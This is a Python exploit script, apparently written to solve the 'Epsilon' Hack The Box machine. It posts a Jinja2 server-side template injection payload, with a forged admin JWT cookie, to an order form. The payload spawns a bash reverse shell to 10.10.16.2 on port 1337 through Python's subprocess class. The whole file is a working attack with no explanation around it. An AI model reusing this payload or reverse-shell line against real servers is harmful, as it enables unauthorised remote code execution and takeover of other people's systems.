#!/usr/bin/env python3

import requests
from re import findall
from html import unescape

url = "http://epsilon.htb:5000/"
path = "order"

payload = "''.__class__.__mro__[1].__subclasses__()[389]('bash -c \"bash -i >& /dev/tcp/10.10.16.2/1337 0>&1\"', shell=True, stdout=-1).communicate()[0].strip()"
data = {
	'costume': f'{{{{{payload }}}}}',
	'q': 9,
	'addr': 'test'
}

# print(f'Sending payload: {payload}')

jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4'
headers = {
	'Cookie': f'auth={jwt}'
}

r = requests.post(url + path, data=data, headers=headers)
text = r.text

juice = findall(r'Your order of "(.*?)" has been placed successfully.',r.text)[0]
print(unescape(juice))
# print(text)